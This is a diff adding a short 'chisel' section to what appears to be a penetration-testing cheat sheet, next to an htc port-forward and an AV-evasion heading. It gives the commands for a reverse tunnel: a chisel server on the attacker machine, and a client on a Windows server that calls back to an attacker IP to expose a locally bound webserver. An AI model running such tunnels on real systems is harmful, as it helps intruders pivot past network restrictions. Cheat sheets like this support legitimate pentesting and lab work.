@@ -2224,6 +2224,22 @@ htc --forward-port 8080 10.10.10.10:4444
 ```
 4. Connect with a RDP tool to 127.0.0.1:8080 (attacker machine)
 
+## chisel
+Assume we have a windows server that has a webserver that is only available locally (port 9090). We now want to setup a port forwarding so we can access this webserver using our attacker box.
+
+On attacker machine:
+```
+chisel server -p 9999 --reverse
+```
+
+On windows server:
+
+```
+.\chisel.exe client 10.10.14.14:9999 R:9090:127.0.0.1:9090
+```
+
+Now you can access the webpage under http://localhost:9090
+
 
 # AV Evasion
 
